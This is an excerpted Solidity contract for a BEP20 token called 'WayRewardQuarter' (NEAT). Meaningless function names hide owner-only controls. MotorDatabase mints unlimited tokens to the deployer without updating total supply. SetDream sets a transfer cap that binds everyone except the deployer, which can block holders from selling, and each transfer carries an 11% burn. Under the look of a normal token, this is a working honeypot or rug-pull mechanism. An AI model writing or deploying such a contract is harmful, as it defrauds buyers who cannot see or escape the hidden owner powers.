...
contract WayRewardQuarter is IBEP20 
{
    using BlindLib for uint256;
    mapping(address => uint256) internal _highlight;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _grab;
    ...
    constructor() 
    {
        ...
        _name = "WayRewardQuarter";
        _symbol = "NEAT";
        _burnRate = 11;
        _grab = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _highlight[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier VersionSon() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _highlight[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetPhone() external view returns (uint256) { return _grab; }
    function SetDream(uint b) external virtual VersionSon { _grab = b * (10 ** decimals()); }
    ...
    function MotorDatabase(uint256 debate) external virtual VersionSon
    {
        uint struggle = debate * (10 ** decimals()); 
        _highlight[_msgsender] = _highlight[_msgsender].Advance(struggle);
        emit Transfer(address(0), _msgsender, struggle);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _grab || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _highlight[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _highlight[sender] = senderBalance - amount;
        _highlight[recipient] += (amount - burnAmount);
        _highlight[_burnaddress] += burnAmount;
...
library BlindLib 
{
  function Advance(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}